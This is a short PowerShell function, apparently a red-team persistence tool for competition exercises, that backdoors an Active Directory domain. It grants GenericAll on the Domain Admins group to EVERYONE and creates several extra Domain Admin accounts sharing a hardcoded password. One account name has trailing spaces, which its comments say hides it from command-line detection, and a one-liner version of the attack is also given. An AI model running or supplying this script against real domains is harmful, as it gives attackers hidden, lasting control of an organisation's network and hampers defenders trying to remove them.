function Add-PersistDomainAdmins {
    <#
    .SYNOPSIS
    This uses the Powershell Active Directory module's New-ADUser and Add-ADGroupMember to create multiple extraneous Domain Admins.
    Supplement users with a GenericAll ACL granted to EVERYONE so multiple other users of choice can be elevated
    Function: Add-PersistDomainAdmins
    Author: Altoid0, Twitter: @Altoid0day
    Version: 1.0
    .DESCRIPTION
    Just spam the DC with extra Domain Admins and configure GenericAll for EVERYONE for persistence
    .NOTES
    Simple trick to add complexity can be the addition of spaces at the end of usernames. 
    They are invisible from the CLI making it difficult to detect and delete users without the presence of a GUI.

    One Liner version (can be optimized):
    
    @('a','b','c','d','e','f') | % {New-ADUser $_ -Enabled $true -AccountPassword (ConvertTo-SecureString "CyberPatriot1!" -AsPlainText -Force);Add-ADGroupMember -Identity "Domain Admins" -Members $_}
    #>
    # $Domain = $env:USERDNSDOMAIN
    $DefaultPartition = (Get-ADDomainController).DefaultPartition
    dsacls "CN=Domain Admins,CN=Users,$DefaultPartition" /G EVERYONE:GA

    @(
        'a',
        'b',
        'c',
        'd',
        'e',
        'f',
        'DefaultAcount    ' # 4 spaces
    ) | ForEach-Object {
        New-ADUser $_ -Enabled $true -AccountPassword (ConvertTo-SecureString "CyberPatriot1!" -AsPlainText -Force)
        Add-ADGroupMember -Identity "Domain Admins" -Members $_
    }
}